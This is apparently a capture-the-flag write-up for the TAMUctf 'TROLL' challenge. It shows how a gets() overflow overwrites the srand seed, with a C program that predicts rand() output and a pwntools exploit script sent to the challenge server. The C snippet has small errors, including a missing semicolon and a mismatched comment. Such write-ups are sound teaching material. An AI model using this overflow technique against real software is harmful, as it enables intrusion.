## TROLL (50pts) ##

![TASK](https://imgur.com/AgJ7rGR.png)

In this task we are supposed to win a game by guessing the next 100 random numbers , looking at the source code we can see the vulnerable gets function , after that we are setting the seed
value to the time and finally the beginning of the loop and generating the random numbers and questions each time .

![MAIN](https://imgur.com/AApFQgK.png)

My idea was to overwrite the seed value with our own value than BINGO we can generate the next random numbers and win the game , i have done things manually , i entered a unique seaquence and than observed with gdb if i have overwritten where the seed value is stored 

My input :
> AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ

![TASK](https://imgur.com/XqjEzZQ.png)

I have entered a sequence of alphabet characters and stopped in the call of srand function , you can see te RDI register(where the 1st argument passed to a function is stored)  hold the value of "MMMM"
so if we replace "MMMM" with the value we want , this value will be the seed for the random numbers.

I have written this little C program to generate 100 random numbers using our chosen seed and stored them in a file :
```c
#include<stdlib.h>
#include<stdio.h>
#include<time.h>

int main(int argc, char *argv[]){
    int i=0;
int seed=3472328296227680305    //0x1000 in decimal
srand(seed);
for(i=0;i<=99;i++){
    int a=rand()% 100000 + 1;
    printf("%d\n",a);  
} 
 return 0;
}
```

After that i have written this exploit to overwrite the seed value with 0x1000 and answer the questions using the numbers we have generated 

```python
from pwn import *
#p=process("./troll")
p=remote("challenges.tamuctf.com",4765)
p.recvuntil("Who goes there?")
SEED="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP1000"
p.sendline(SEED)
log.info("Sent First payload")
answers=open("answer","r")
for line in answers:
        p.recvuntil("What is it?")
        log.info("sending answer: "+line)
        p.sendline(line)
p.interactive()

```
Note: the offset in the remote server is different, so i had to guess it xD However we got our flag : 

![MAIN](https://imgur.com/QjwTHDR.png)

This is the first time writing a pwn writeup so i hope you enjoyed it , any questions you can find me on twitter @BelkahlaAhmed1
